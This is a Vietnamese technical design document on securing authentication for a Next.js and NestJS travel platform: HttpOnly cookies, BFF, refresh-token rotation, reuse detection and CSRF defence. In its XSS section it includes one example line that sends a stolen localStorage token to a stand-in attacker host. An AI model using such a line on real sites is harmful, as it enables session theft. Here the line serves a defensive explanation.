# CHIẾN LƯỢC QUẢN LÝ AUTHENTICATION CROSS-SUBDOMAIN, TOKEN ROTATION ENGINE VÀ BFF PATTERN TRONG KIẾN TRÚC NEXT.JS KẾT HỢP NESTJS

> **Tài liệu phân tích chuyên sâu về kiến trúc xác thực phân tán, cơ chế Token Rotation Engine (Single-Use Refresh Token), phát hiện tấn công Replay Attack (Token Reuse Detection), quản lý Token Family, bảo vệ chống XSS/CSRF với HttpOnly Cookie, mô hình Backend For Frontend (BFF) và ứng dụng thực tiễn trong hệ sinh thái Traveleke (`cg_traveleke_service` & `cg_traveleke_app`).**

---

## MỤC LỤC
1. [Tổng quan bài toán Authentication trong Kiến trúc tách rời Frontend & Backend](#1-tổng-quan-bài-toán-authentication-trong-kiến-trúc-tách-rời-frontend--backend)
2. [Hiểm họa bảo mật khi lưu JWT trong localStorage & Giải pháp HttpOnly Cookie](#2-hiểm-họa-bảo-mật-khi-lưu-jwt-trong-localstorage--giải-pháp-httponly-cookie)
3. [Phân định Thuộc tính Cookie: Host-Only vs Domain Cookie & Cross-Subdomain](#3-phân-định-thuộc-tính-cookie-host-only-vs-domain-cookie--cross-subdomain)
4. [Mô hình Backend For Frontend (BFF Pattern) trong Next.js App Router](#4-mô-hình-backend-for-frontend-bff-pattern-trong-nextjs-app-router)
5. [Cấu trúc Token Phân tầng: Short-lived Access Token & Opaque Refresh Token](#5-cấu-trúc-token-phân-tầng-short-lived-access-token--opaque-refresh-token)
6. [Cơ chế Token Rotation Engine & Cấu trúc Token Family](#6-cơ-chế-token-rotation-engine--cấu-trúc-token-family)
7. [Kỹ thuật Phát hiện Trộm Token (Refresh Token Reuse Detection / Theft Detection)](#7-kỹ-thuật-phát-hiện-trộm-token-refresh-token-reuse-detection--theft-detection)
8. [Quản lý Vòng đời Phiên (Session ID & Absolute Session Lifetime)](#8-quản-lý-vòng-đời-phiên-session-id--absolute-session-lifetime)
9. [Giao dịch Xoay vòng Token Nguyên tử (Atomic Token Rotation Transaction)](#9-giao-dịch-xoay-vòng-token-nguyên-tử-atomic-token-rotation-transaction)
10. [Giải quyết Refresh Race Condition: Client Mutex vs Server Single Flight](#10-giải-quyết-refresh-race-condition-client-mutex-vs-server-single-flight)
11. [Chiến lược Thu hồi Phiên & Đăng xuất (Revocation & Logout Strategy)](#11-chiến-lược-thu-hồi-phiên--đăng-xuất-revocation--logout-strategy)
12. [Phòng thủ CSRF Đa tầng trong Xác thực dựa trên Cookie](#12-phòng-thủ-csrf-đa-tầng-trong-xác-thực-dựa-trên-cookie)
13. [Server-Authoritative Authentication & Ranh giới Trách nhiệm giữa Next.js và NestJS](#13-server-authoritative-authentication--ranh-giới-trách-nhiệm-giữa-nextjs-và-nestjs)
14. [Đối chiếu Thực trạng Hệ thống Traveleke trước khi Tối ưu](#14-đối-chiếu-thực-trạng-hệ-thống-traveleke-trước-khi-tối-ưu)
15. [Chi tiết các Cải tiến Đã Triển khai trong Source Code](#15-chi-tiết-các-cải-tiến-đã-triển-khai-trong-source-code)
16. [Tổng kết Giá trị và Lợi ích Vượt trội](#16-tổng-kết-giá-trị-và-lợi-ích-vượt-trội)

---

## 1. TỔNG QUAN BÀI TOÁN AUTHENTICATION TRONG KIẾN TRÚC TÁCH RỜI FRONTEND & BACKEND

Trong các hệ sinh thái ứng dụng quy mô lớn, kiến trúc tách biệt giữa **Frontend Client** (Next.js chạy tại `app.traveleke.com` hoặc `localhost:3000`) và **Backend API Server** (NestJS chạy tại `api.traveleke.com` hoặc `localhost:3001`) là tiêu chuẩn công nghiệp nhằm phục vụ khả năng phát triển độc lập, tối ưu hóa hạ tầng và mở rộng quy mô.

Tuy nhiên, việc tách rời này kéo theo bài toán bảo mật phiên phức tạp hơn rất nhiều so với mô hình Monolithic truyền thống:
- Làm thế nào để lưu trữ token an toàn trên trình duyệt mà không bị tấn công đánh cắp qua **XSS**?
- Làm thế nào để Server-Side Rendering (SSR) trong Next.js lấy được thông tin phiên người dùng mà không bị hiện tượng giật giao diện (**Authentication Flash**)?
- Khi nhiều thẻ trình duyệt hoặc nhiều request SSR đồng thời phát hiện Access Token hết hạn, làm thế nào để tránh tình trạng **Refresh Race Condition** làm hủy nhầm phiên hợp lệ?
- Khi kẻ tấn công đánh cắp được Refresh Token, hệ thống có cơ chế nào để **phát hiện và vô hiệu hóa ngay lập tức** toàn bộ chuỗi token liên quan?

```text
       ┌─────────────────────────────────────────────────────────────┐
       │                TRÌNH DUYỆT KHÁCH HÀNG (CLIENT)              │
       │   • Giao diện React UI                                      │
       │   • Axios Interceptor Mutex (Hàng đợi Single Flight)        │
       │   • HttpOnly, Secure, SameSite=Lax Cookie Store             │
       └──────────────────────────────┬──────────────────────────────┘
                                      │
               Cookie tự động đính kèm (withCredentials: true)
                                      ▼
       ┌─────────────────────────────────────────────────────────────┐
       │                 NEXT.JS 16 BFF LAYER (HOST)                 │
       │   • Route Handlers & Server Functions                       │
       │   • SSR Session Reading (Không phụ thuộc localStorage)      │
       │   • Thêm Bearer Access Token khi giao tiếp server-to-server │
       └──────────────────────────────┬──────────────────────────────┘
                                      │
                     Internal HTTP / Authorization Header
                                      ▼
       ┌─────────────────────────────────────────────────────────────┐
       │                   NESTJS 11 BACKEND API                     │
       │   • Token Rotation Engine (Single-Use Refresh Token)        │
       │   • Theft Detection (Phát hiện Replay Attack / Token Reuse) │
       │   • Bảng refresh_tokens lưu băm SHA-256 (Opaque Token)     │
       │   • Session Revocation & JwtAuthGuard / RolesGuard          │
       └─────────────────────────────────────────────────────────────┘
```

---

## 2. HIỂM HỌA BẢO MẬT KHI LƯU JWT TRONG LOCALSTORAGE & GIẢI PHÁP HTTPONLY COOKIE

### 2.1. Lỗ hổng Trộm Token qua XSS khi dùng `localStorage`
Lưu Access Token và Refresh Token trong `localStorage` hoặc `sessionStorage` là sai lầm phổ biến nhất trong các ứng dụng SPA:
- **Nguyên nhân:** Toàn bộ JavaScript chạy trong cùng Origin đều có toàn quyền đọc `window.localStorage`.
- **Rủi ro:** Nếu website dính lỗ hổng **Cross-Site Scripting (XSS)** (qua một thư viện npm bên thứ ba bị cài mã độc, một comment của người dùng chứa mã độc, hoặc dùng `dangerouslySetInnerHTML`), script độc hại sẽ dễ dàng trích xuất token:
  ```javascript
  // Kẻ tấn công gửi toàn bộ token về máy chủ gián điệp trong 1 dòng code:
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('traveleke_token'));
  ```
- Sau khi bị trích xuất ra khỏi trình duyệt (**Token Exfiltration**), kẻ tấn công có thể ung dung giả mạo người dùng từ bất kỳ thiết bị nào trên thế giới cho đến khi token hết hạn.

### 2.2. Giải pháp: `HttpOnly` Cookie
- Cookie được cấu hình cờ `HttpOnly` sẽ **hoàn toàn vô hình đối với JavaScript** (`document.cookie` không thể đọc được giá trị).
- Trình duyệt tự động đính kèm cookie vào HTTP Request gửi tới backend theo các quy tắc bảo mật của trình duyệt.
- **Lưu ý quan trọng:** `HttpOnly` không ngăn chặn được việc script độc hại kích hoạt request thay mặt người dùng trong origin hiện tại, nhưng nó **ngăn chặn triệt để việc lấy cắp token thô ra khỏi máy khách**, thu hẹp phạm vi tấn công và bảo vệ an toàn cho Refresh Token dài hạn.

---

## 3. PHÂN ĐỊNH THUỘC TÍNH COOKIE: HOST-ONLY VS DOMAIN COOKIE & CROSS-SUBDOMAIN

### 3.1. Các thuộc tính chuẩn mực của Authentication Cookie
Một Cookie bảo mật cấp Enterprise cần thiết lập đầy đủ các thuộc tính:
- `HttpOnly`: Cấm JavaScript truy cập.
- `Secure`: Bắt buộc chỉ truyền qua giao thức mã hóa HTTPS (trên môi trường phát triển localhost có thể linh hoạt).
- `SameSite`: Kiểm soát việc gửi cookie trong các ngữ cảnh cross-site:
  - `Strict`: Rất chặt, không gửi cookie ngay cả khi người dùng bấm link từ trang khác chuyển sang.
  - `Lax` *(Khuyến nghị chuẩn)*: Cân bằng hoàn hảo giữa bảo mật và trải nghiệm, gửi cookie khi điều hướng top-level GET, chặn cookie khi có cross-site POST/PUT.
  - `None`: Cho phép cross-site nhưng bắt buộc phải có `Secure`.
- `Path=/`: Giới hạn phạm vi đường dẫn hợp lệ của cookie.
- `Max-Age` / `Expires`: Xác định hạn dùng vật lý của cookie trên đĩa cứng trình duyệt.

### 3.2. Host-Only Cookie vs Domain Cookie
- **Host-Only Cookie (Không khai báo `Domain`):** Cookie chỉ thuộc về đúng host tạo ra nó (ví dụ: `app.traveleke.com`). Subdomain khác như `api.traveleke.com` hoàn toàn không nhận được cookie này.
- **Domain Cookie (`Domain=traveleke.com`):** Cookie được chia sẻ xuyên suốt mọi subdomain (`app.traveleke.com`, `admin.traveleke.com`, `api.traveleke.com`). Tiện cho việc chia sẻ session nhưng làm tăng bề mặt tấn công nếu một subdomain vệ tinh bị kiểm soát.
- **Tiền tố chuẩn `__Host-`:** Yêu cầu bắt buộc `Secure`, `Path=/` và không được set `Domain`, ép buộc trình duyệt áp đặt phạm vi Host-Only chặt chẽ nhất.

---

## 4. MÔ HÌNH BACKEND FOR FRONTEND (BFF PATTERN) TRONG NEXT.JS APP ROUTER

Mô hình **Backend For Frontend (BFF)** là một giải pháp kiến trúc tối ưu khi kết hợp Next.js và NestJS:
1. **Next.js đóng vai trò BFF:**
   - Trình duyệt **chỉ giao tiếp với Next.js** (Same-Origin).
   - Next.js quản lý `HttpOnly` Cookie và phiên SSR.
   - Next.js Route Handlers (`/api/auth/*`) nhận request từ trình duyệt, kiểm tra cookie, rồi thực hiện lệnh gọi **Server-to-Server** sang NestJS Backend.
2. **Loại bỏ sự phức tạp của CORS:**
   - Vì trình duyệt gọi trực tiếp vào origin của chính nó (`Same-Origin`), bài toán CORS giữa trình duyệt và Backend được triệt tiêu hoàn toàn.
   - Lệnh gọi giữa Next.js Server và NestJS Server diễn ra trong mạng nội bộ an toàn (Internal VPC / Private Network) với độ trễ cực thấp.

---

## 5. CẤU TRÚC TOKEN PHÂN TẦNG: SHORT-LIVED ACCESS TOKEN & OPAQUE REFRESH TOKEN

Hệ thống Traveleke áp dụng cấu trúc phân tầng 2 loại Token:

| Tiêu chí | Access Token | Refresh Token |
| :--- | :--- | :--- |
| **Định dạng** | JWT (JSON Web Token) tự chứa thông tin (Stateless). | **Opaque Token** ngẫu nhiên có độ hỗn loạn cao (48-byte URL-safe string). |
| **Thời gian sống** | Cực ngắn (**15 phút**). | Tương đối (**7 ngày**), bị chặn bởi trần tuyệt đối (**30 ngày**). |
| **Lưu trữ CSDL** | Không lưu trong CSDL (NestJS xác thực chữ ký cryptographic). | **Bắt buộc lưu bản băm SHA-256** trong bảng `refresh_tokens`. |
| **Vị trí lưu Client** | Bộ nhớ RAM (hoặc short-lived cookie). | **HttpOnly Secure Cookie** hoặc lưu trữ bảo mật. |
| **Mục đích** | Đính kèm vào `Authorization: Bearer <token>` để gọi API nghiệp vụ. | Dùng để xin cấp cặp Access Token & Refresh Token mới khi Access Token hết hạn. |

### Cơ chế Opaque Token Hashing (Chống rò rỉ CSDL)
- Raw Refresh Token được tạo bằng nguồn ngẫu nhiên mật mã học: `crypto.randomBytes(48).toString('base64url')` ($256\text{-bit}$ entropy).
- NestJS **tuyệt đối không lưu plaintext** chuỗi này vào Database. Hệ thống chỉ lưu chuỗi băm:
  $$\text{TokenHash} = \text{SHA256}(\text{RawRefreshToken})$$
- Khi CSDL bị rò rỉ (SQL Injection, backup leak), kẻ tấn công **hoàn toàn không thể tái tạo lại Refresh Token gốc** để mạo danh người dùng (tương tự nguyên lý băm mật khẩu với bcrypt).

---

## 6. CƠ CHẾ TOKEN ROTATION ENGINE & CẤU TRÚC TOKEN FAMILY

### 6.1. Nguyên tắc Single-Use Refresh Token
- Mỗi Refresh Token sinh ra **chỉ được phép sử dụng đúng 1 lần duy nhất**.
- Khi Client gửi Refresh Token $R_1$ lên để xin cấp lại token:
  1. Server kiểm tra tính hợp lệ của $R_1$.
  2. Server lập tức đánh dấu $R_1$ chuyển trạng thái thành `USED`.
  3. Server phát hành một Refresh Token mới $R_2$ (Successor).
  4. Lần tiếp theo, Client bắt buộc phải sử dụng $R_2$.

### 6.2. Cấu trúc Token Family
Tất cả các thế hệ Refresh Token phát sinh từ cùng một phiên đăng nhập ban đầu sẽ thuộc về cùng một **Token Family** (`family_id`):
$$R_1 \xrightarrow{\text{rotate}} R_2 \xrightarrow{\text{rotate}} R_3 \xrightarrow{\text{rotate}} R_4 \quad (\text{Cùng chung Family ID})$$
- Nhờ lưu lại liên kết `parent_token_id` và `family_id`, CSDL nắm giữ toàn bộ cây phả hệ của phiên làm việc.

---

## 7. KỸ THUẬT PHÁT HIỆN TRỘM TOKEN (REFRESH TOKEN REUSE DETECTION / THEFT DETECTION)

Đây là cơ chế phòng thủ tinh vi và quan trọng nhất của Token Rotation Engine:

### 7.1. Kịch bản Tấn công Token Theft:
1. Kẻ tấn công bằng cách nào đó đánh cắp được Refresh Token $R_1$ của người dùng.
2. Người dùng hợp lệ dùng $R_1$ để refresh $\rightarrow$ Hệ thống đánh dấu $R_1$ là `USED`, cấp $R_2$ cho người dùng hợp lệ.
3. Vài phút sau, kẻ tấn công dùng lại token $R_1$ đã đánh cắp để yêu cầu cấp quyền.
4. **Phát hiện tái sử dụng (Reuse Detection):**
   - NestJS tra cứu $R_1$ trong bảng `refresh_tokens`.
   - Thấy trạng thái của $R_1$ hiện tại là **`USED`** (hoặc `REVOKED`)!
   - NestJS lập tức nhận diện đây là hành vi **Replay Attack / Token Theft**!

### 7.2. Phản ứng Tự vệ Tức thì của Hệ thống:
- Hệ thống không chỉ từ chối request của kẻ tấn công mà còn **lập tức thu hồi vĩnh viễn toàn bộ Token Family**:
  ```sql
  UPDATE refresh_tokens
  SET status = 'REVOKED', revoked_at = NOW()
  WHERE family_id = :familyId;
  ```
- Token $R_2$ trên tay người dùng hợp lệ cũng bị vô hiệu hóa ngay tức khắc.
- Lần gọi tiếp theo của người dùng sẽ bị từ chối, buộc người dùng phải đăng nhập lại bằng mật khẩu.
- Ghi nhận **Security Alert Log** với đầy đủ IP, User Agent, User ID và Family ID để điều tra an ninh.

---

## 8. QUẢN LÝ VÒNG ĐỜI PHIÊN (SESSION ID & ABSOLUTE SESSION LIFETIME)

### 8.1. Cạm bẫy Phiên Bất tử (Infinite Session Trap)
Nếu mỗi lần xoay vòng token lại cấp một hạn dùng tương đối (TTL 7 ngày) mới tinh mà không có trần giới hạn, một phiên làm việc có thể tồn tại **vô hạn năm tháng**, tạo kẽ hở cho kẻ xấu duy trì quyền truy cập lâu dài.

### 8.2. Giải pháp: Absolute Session Lifetime
Mỗi Token Family khi sinh ra từ lệnh đăng nhập ban đầu sẽ được ấn định một mốc thời gian tuyệt đối không thể thay đổi (**`absolute_expires_at`**, ví dụ 30 ngày):
- Dù có xoay vòng bao nhiêu lần, hạn chót của token con cháu **không bao giờ được vượt quá `absolute_expires_at`**.
- Khi chạm mốc 30 ngày, hệ thống bắt buộc người dùng xác thực lại danh tính.

---

## 9. GIAO DỊCH XOAY VÒNG TOKEN NGUYÊN TỬ (ATOMIC TOKEN ROTATION TRANSACTION)

Quá trình xoay vòng Refresh Token:
1. Đánh dấu token cũ là `USED`.
2. Tạo và chèn bản ghi token mới `ACTIVE`.
3. Kiểm tra tính toàn vẹn của tài khoản người dùng.

> **Yêu cầu nghiêm ngặt:** Cả 3 bước trên **bắt buộc phải nằm trong một Database Transaction duy nhất** có cơ chế Deadlock Retry (`runWithDeadlockRetry`). Nếu không có transaction nguyên tử, hai request đồng thời có thể cùng đọc thấy token cũ ở trạng thái `ACTIVE` và cùng sinh ra 2 nhánh token con cháu, phá vỡ cấu trúc Token Family.

---

## 10. GIẢI QUYẾT REFRESH RACE CONDITION: CLIENT MUTEX VS SERVER SINGLE FLIGHT

### 10.1. Cơn ác mộng Concurrent 401 trên Dashboard
Khi người dùng mở một trang Dashboard phức tạp (đồng thời tải Profile, Thống kê doanh thu, Lịch sử đặt phòng, Thông báo realtime), nếu Access Token vừa hết hạn:
- Cả 5 request HTTP cùng nhận về mã lỗi HTTP 401.
- Nếu cả 5 request cùng gửi Refresh Token lên server cùng 1 mili-giây:
  - Request 1 đến trước: Thành công, token cũ bị đổi sang `USED`.
  - Request 2, 3, 4, 5 đến sau vài phần nghìn giây: Nhìn thấy token cũ đã `USED` $\rightarrow$ Kích hoạt cơ chế chống trộm $\rightarrow$ Thu hồi toàn bộ session của người dùng! Người dùng bị văng ra màn hình đăng nhập một cách oan uổng (**False Positive**).

### 10.2. Giải pháp: Client-Side Mutex & Request Queue trong Axios
Xây dựng biến cờ `isRefreshing` và hàng đợi `failedQueue` trong Axios Interceptor:
- Khi request đầu tiên gặp 401: Khóa cờ `isRefreshing = true`, giữ vai trò thực hiện refresh.
- Các request 2, 3, 4, 5 gặp 401: Nhìn thấy `isRefreshing === true`, không gửi refresh nữa mà tự đóng băng vào `failedQueue` dạng Promise.
- Khi request đầu tiên nhận được token mới: Bơm token mới cho toàn bộ các request đang xếp hàng trong `failedQueue` và tự động gửi lại chúng.

```typescript
// Triển khai thực tế trong cg_traveleke_app/src/services/api/client.ts:
if (isRefreshing) {
  return new Promise<string>((resolve, reject) => {
    failedQueue.push({ resolve, reject });
  }).then((token) => {
    originalRequest.headers.Authorization = `Bearer ${token}`;
    return apiClient(originalRequest);
  });
}
```

---

## 11. CHIẾN LƯỢC THU HỒI PHIÊN & ĐĂNG XUẤT (REVOCATION & LOGOUT STRATEGY)

Đăng xuất chuyên nghiệp cấp Enterprise không đơn thuần là xóa token ở client:
1. **Single Logout (`POST /api/auth/logout`):**
   - Client gửi Refresh Token (hoặc cookie).
   - Server băm token, tìm `family_id` và chuyển trạng thái toàn bộ Family sang `REVOKED`.
   - Server xóa `HttpOnly` Cookie bằng lệnh `res.clearCookie('traveleke_refresh_token')`.
2. **Logout All Devices (`POST /api/auth/logout-all`):**
   - Vô hiệu hóa toàn bộ các bản ghi `refresh_tokens` đang `ACTIVE` của người dùng.
   - Hữu ích khi người dùng đổi mật khẩu hoặc nghi ngờ tài khoản bị lộ.

---

## 12. PHÒNG THỦ CSRF ĐA TẦNG TRONG XÁC THỰC DỰA TRÊN COOKIE

Khi sử dụng Cookie, trình duyệt tự động đính kèm cookie khi gửi request, tạo nguy cơ **Cross-Site Request Forgery (CSRF)**. Hệ thống Traveleke thiết lập phòng thủ 3 lớp:
1. **Lớp 1 - `SameSite=Lax`:** Ngăn chặn trình duyệt gửi cookie trong các ngữ cảnh cross-site POST/PUT từ website lạ.
2. **Lớp 2 - Custom Request Header:** Tất cả request từ `apiClient` đều có header `Content-Type: application/json`. Các website tấn công form HTML truyền thống không thể tự ý thêm custom header nếu không có CORS preflight.
3. **Lớp 3 - Origin & Referer Verification:** NestJS CORS kiểm tra nguồn gốc `FRONTEND_URL` một cách tuyệt đối, từ chối mọi origin không tin cậy.

---

## 13. SERVER-AUTHORITATIVE AUTHENTICATION & RANH GIỚI TRÁCH NHIỆM

- **Next.js Client (React / Zustand / Context):** Chỉ lưu trữ thông tin hiển thị (Avatar, Tên hiển thị, Role hiển thị). State ở client chỉ là **Derived State**, không được dùng làm bằng chứng bảo mật.
- **Next.js Proxy / Route Handlers:** Kiểm tra sự tồn tại của session để chuyển hướng UX (Redirect khách chưa đăng nhập). Tuyệt đối không thực hiện query CSDL nặng ở tầng Proxy.
- **NestJS Backend:** Là **nguồn sự thật duy nhất (Single Source of Truth)**. Mọi thao tác nghiệp vụ, đổi trạng thái đơn, đặt phòng, sửa giá đều phải vượt qua `JwtAuthGuard` và `RolesGuard` trực tiếp trên API.

---

## 14. ĐỐI CHIẾU THỰC TRẠNG HỆ THỐNG TRAVELEKE TRƯỚC KHI TỐI ƯU

| Hạng mục kiểm tra | Hiện trạng trước khi tối ưu | Nguy cơ / Thiếu sót |
| :--- | :--- | :--- |
| **Cơ chế Token Backend** | Chỉ phát hành duy nhất 1 Access Token JWT sống lâu (7 ngày). | Không có Refresh Token, không thể thu hồi token bị lộ giữa chừng. |
| **Lưu trữ Token Frontend** | Lưu trực tiếp `access_token` vào `localStorage`. | Nguy cơ bị đánh cắp toàn bộ quyền đăng nhập khi có lỗ hổng XSS. |
| **Xoay vòng Token (Rotation)** | Không có. | Vi phạm nguyên tắc Single-Use Credential. |
| **Chống Replay Attack** | Không có cơ chế nhận diện token cũ. | Kẻ trộm token có thể dùng token song song với người dùng mà không bị phát hiện. |
| **Xử lý Concurrent 401** | Khi gặp 401 lập tức xóa `localStorage` và reload trang về `/login`. | Gây gián đoạn trải nghiệm người dùng, văng đăng nhập vô lý khi mạng lag. |
| **Cơ chế Đăng xuất** | Endpoint `/auth/logout` chỉ trả về string JSON rỗng, không làm gì ở CSDL. | Token bị đánh cắp vẫn tiếp tục sử dụng được sau khi người dùng bấm Đăng xuất. |

---

## 15. CHI TIẾT CÁC CẢI TIẾN ĐÃ TRIỂN KHAI TRONG SOURCE CODE

### 15.1. Phía Backend (`cg_traveleke_service`)
1. **Tạo Entity `RefreshToken`:**
   - File: [`backend/src/auth/entities/refresh-token.entity.ts`](file:///Users/dangquangminh/cg_traveleke_service/backend/src/auth/entities/refresh-token.entity.ts)
   - Lưu trữ `sessionId`, `familyId`, `tokenHash` (SHA-256), `status` (`ACTIVE`, `USED`, `REVOKED`, `EXPIRED`), `expiresAt`, `absoluteExpiresAt`.
   - Đăng ký vào [`AuthModule`](file:///Users/dangquangminh/cg_traveleke_service/backend/src/auth/auth.module.ts).
2. **Nâng cấp `AuthService`:**
   - File: [`backend/src/auth/auth.service.ts`](file:///Users/dangquangminh/cg_traveleke_service/backend/src/auth/auth.service.ts)
   - Khởi tạo bảng CSDL tự động qua `ensureTableExists()`.
   - Rút ngắn Access Token JWT xuống **15 phút**.
   - Phát hành Opaque Refresh Token 48-byte URL-safe ngẫu nhiên và lưu băm SHA-256.
   - Triển khai `rotateRefreshToken()`: Tự động phát hiện token reuse, thu hồi toàn bộ Token Family, ghi Security Trace Log, và xoay vòng nguyên tử trong Database Transaction.
   - Triển khai `logout()` và `logoutAll()` thu hồi token trên máy chủ.
3. **Nâng cấp `AuthController`:**
   - File: [`backend/src/auth/auth.controller.ts`](file:///Users/dangquangminh/cg_traveleke_service/backend/src/auth/auth.controller.ts)
   - Thêm endpoint `POST /api/auth/refresh` với Rate Limit Sliding Window.
   - Tự động thiết lập và dọn dẹp Cookie `traveleke_refresh_token` (`HttpOnly`, `SameSite=Lax`, `Secure`).
   - Thêm endpoint `POST /api/auth/logout-all`.

### 15.2. Phía Frontend (`cg_traveleke_app`)
1. **Nâng cấp `apiClient` với Mutex Single Flight:**
   - File: [`src/services/api/client.ts`](file:///Users/dangquangminh/cg_traveleke_app/src/services/api/client.ts)
   - Kích hoạt `withCredentials: true` để gửi cookie HttpOnly.
   - Xây dựng cơ chế hàng đợi `failedQueue` và cờ `isRefreshing` xử lý đồng bộ các request 401 đồng thời.
2. **Cập nhật Types & Contexts:**
   - File: [`src/types/auth.ts`](file:///Users/dangquangminh/cg_traveleke_app/src/types/auth.ts) (thêm `refresh_token`).
   - File: [`src/features/auth/context/AuthContext.tsx`](file:///Users/dangquangminh/cg_traveleke_app/src/features/auth/context/AuthContext.tsx) (quản trị viên/nhân viên).
   - File: [`src/features/auth/context/CustomerAuthContext.tsx`](file:///Users/dangquangminh/cg_traveleke_app/src/features/auth/context/CustomerAuthContext.tsx) (khách hàng).

---

## 16. TỔNG KẾT GIÁ TRỊ VÀ LỢI ÍCH VƯỢT TRỘI

```text
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                        HIỆU QUẢ SAU KHI TRIỂN KHAI TOÀN DIỆN                           │
├────────────────────────────────────────┬───────────────────────────────────────────────┤
│ Trước khi tối ưu                       │ Sau khi tối ưu                                │
├────────────────────────────────────────┼───────────────────────────────────────────────┤
│ • Token sống 7 ngày trong localStorage │ • Access Token chỉ sống 15 phút; Refresh Token│
│   dễ bị XSS đánh cắp vĩnh viễn.        │   được bảo vệ qua HttpOnly Cookie + SHA-256.  │
│ • Không phát hiện được việc token bị lộ│ • Tự động phát hiện Replay Attack và hủy      │
│   hay dùng trộm song song.             │   ngay lập tức toàn bộ Token Family.          │
│ • Khi token hết hạn, nhiều request 401 │ • Client Mutex hàng đợi (Single Flight) tự    │
│   làm văng người dùng ra trang login.  │   động làm mới token ngầm không giật lag.     │
│ • Đăng xuất chỉ là hình thức ở client, │ • Thu hồi phiên thực sự trên CSDL CSDL        │
│   token vẫn sống hợp lệ trên server.   │   và hỗ trợ đăng xuất khỏi mọi thiết bị.      │
└────────────────────────────────────────┴───────────────────────────────────────────────┘
```

1. **Bảo mật Cấp Ngân hàng (Enterprise Grade Security):**
   - Đạt chuẩn bảo mật OWASP cho kiến trúc xác thực phân tán.
   - Vô hiệu hóa nguy cơ đánh cắp token qua XSS và triệt tiêu khả năng phát tán phiên trái phép.
2. **Trải nghiệm Người dùng Liền mạch (Zero-Friction UX):**
   - Người dùng không bao giờ bị gián đoạn hay bị văng khỏi hệ thống giữa chừng nhờ cơ chế Silent Refresh chạy ngầm.
3. **Khả năng Giám sát & Ứng phó Sự cố (Security Observability):**
   - Đội ngũ bảo mật có thể truy vết chính xác thiết bị, IP, thời điểm và chuỗi token bị replay để phản ứng tức thời.
